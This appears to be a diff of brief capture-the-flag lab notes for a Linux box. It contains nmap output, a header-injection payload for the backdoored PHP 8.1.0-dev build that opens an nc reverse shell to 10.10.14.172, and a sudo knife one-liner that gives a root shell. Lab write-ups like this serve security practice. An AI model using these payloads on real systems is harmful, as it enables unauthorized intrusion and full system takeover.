@@ -4,6 +4,7 @@
 
 ## nmap
 
+```
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
@@ -13,18 +14,22 @@
 |_http-title:  Emergent Medical Idea
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
 ## http 80
 
-X-Powered-By
-	PHP/8.1.0-dev
+X-Powered-By: PHP/8.1.0-dev
 
+```
 User-Agentt: zerodiumsystem('id');
 User-Agentt: zerodiumsystem('rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.172 1234 >/tmp/f');
+```
 
 ## root
 
+```sh
 $ sudo -l
     (root) NOPASSWD: /usr/bin/knife
+```
 
 GTFOBins: sudo knife exec -E 'exec "/bin/bash"'
